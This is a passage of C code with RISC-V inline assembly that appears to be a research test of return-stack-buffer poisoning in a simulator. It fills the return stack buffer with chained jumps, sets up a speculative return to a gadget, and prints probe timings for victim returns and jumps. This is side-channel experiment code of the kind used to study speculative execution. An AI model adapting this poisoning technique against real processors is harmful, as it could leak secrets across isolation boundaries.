"
            "28: jal x0, 29f
"
            "29: jal x0, 30f
"
            "30: jal x0, 31f
"
            "31: ret
" // Speculative return for the gadget
            "skip_gadget_architecturally_2:
" // Architectural execution continues here
            : : "i"(RAS_SIZE - 1)
        );
        victim_jumps(); // This `j` will *not* mispredict to `fingerprinting_gadget_label_2`
        results_victim_jumps[i] = probe_sequence();
    }

    printf("Victim RETs (RAS poisoned): ");
    for (int i = 0; i < NUM_ATTACK_TRIALS; i++) {
        printf("%lu ", results_victim_ret[i]);
    }
    printf("
");

    printf("Victim JUMPS (RAS poisoned): ");
    for (int i = 0; i < NUM_ATTACK_TRIALS; i++) {
        printf("%lu ", results_victim_jumps[i]);
    }
    printf("
");

    tohost = 1; // Terminate simulation
    while (1) {}
}

